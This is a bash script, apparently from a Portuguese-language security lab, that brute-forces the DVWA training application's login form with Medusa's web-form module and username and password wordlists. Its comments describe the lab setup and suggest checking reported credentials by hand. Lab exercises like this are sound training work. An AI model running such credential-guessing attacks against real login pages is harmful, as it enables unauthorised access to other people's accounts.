#!/usr/bin/env bash
#
# 02_dvwa_web_form.sh
# Automação de tentativas de login no formulário web do DVWA
# (Damn Vulnerable Web Application) usando o módulo web-form do Medusa.
#
# USO:
#   ./02_dvwa_web_form.sh <IP_DO_DVWA>
#
# IMPORTANTE:
#   - O DVWA precisa estar configurado com nível de segurança "low"
#     (Security Level) para este teste didático.
#   - Antes de rodar: abra a página de login do DVWA no navegador,
#     veja o código-fonte (Ctrl+U) e confirme os nomes dos campos
#     (geralmente: username, password, Login) e o valor exato do
#     cookie de sessão (PHPSESSID) + token CSRF (user_token), se houver.
#   - Ajuste a string abaixo conforme a página do seu DVWA.
#
set -euo pipefail

TARGET="${1:?Uso: $0 <IP_DO_ALVO>}"
USERS="../wordlists/usuarios.txt"
PASSWORDS="../wordlists/senhas.txt"

# Formato do módulo web-form do Medusa:
# <path-do-form>:<campos-postados>:<string-que-indica-falha-de-login>
FORM_STRING="/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"

echo "[*] Executando Medusa contra o formulário de login do DVWA"
medusa -h "$TARGET" -U "$USERS" -P "$PASSWORDS" \
  -M web-form \
  -m FORM:"$FORM_STRING" \
  -t 3

echo "[*] Dica: valide manualmente qualquer credencial reportada como válida"
echo "    antes de considerar o teste concluído (falsos positivos são comuns"
echo "    em formulários web)."
